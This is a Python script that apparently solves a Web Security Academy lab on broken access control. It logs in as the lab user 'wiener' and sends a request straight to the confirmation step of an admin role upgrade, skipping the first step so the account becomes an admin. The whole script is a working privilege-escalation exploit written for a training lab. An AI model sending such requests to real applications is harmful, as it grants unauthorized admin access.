##########################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 5/9/2023
#
# Lab: Multi-step process with no access control on one step
#
# Steps: 1. Login as wiener
#        2. Upgrade wiener to be an admin bypassing the first step
#
##########################################################################

###########
# imports
###########
import requests
from colorama import Fore

# change this to your lab URL
url = "https://0a2e009703e633a78243512f006800f2.web-security-academy.net"

try:  
    # set credentials
    data = {
        "username": "wiener",
        "password": "peter"
    }
    
    # login as wiener
    login = requests.post(f"{url}/login", data, allow_redirects=False)
    
    if login.status_code == 302:
        print(Fore.WHITE + "1. Logging in as wiener.. " + Fore.GREEN + "OK")

        # get session cookie
        session = login.cookies.get("session")
        
        try:  
            # set session cookie
            cookies = {"session": session}
            
            # set credentials
            data = {
                "username": "wiener",
                "action": "upgrade",
                "confirmed": "true"
            }
            
            # upgrade wiener to be an admin bypassing the first step
            upgrade_wiener = requests.post(f"{url}/admin-roles", data, cookies=cookies)
            
            print(Fore.WHITE + "2. Upgrading wiener to be an admin bypassing the first step.. " + Fore.GREEN + "OK")
            
            print(Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
        
        except:
            print(Fore.RED + "[!] Failed to upgrade wiener to be an admin through exception")

    else:
        print(Fore.RED + "[!] Failed to login as wiener")

except:
    print(Fore.RED + "[!] Failed to login as wiener through exception")
